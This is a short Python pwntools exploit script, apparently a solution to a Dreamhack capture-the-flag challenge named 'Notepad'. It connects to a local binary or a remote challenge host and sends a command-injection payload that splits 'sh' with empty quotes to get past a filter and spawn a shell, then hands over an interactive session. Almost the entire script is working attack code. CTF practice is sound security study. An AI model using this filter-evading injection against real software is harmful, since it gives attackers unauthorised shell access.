#!/usr/bin/env python3

from pwn import *

exe = ELF("./Notepad")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 16967)

    return r


def main():
    r = conn()
    
    r.sendline(b"&& s\"\"h || \"\"")
    r.interactive()


if __name__ == "__main__":
    main()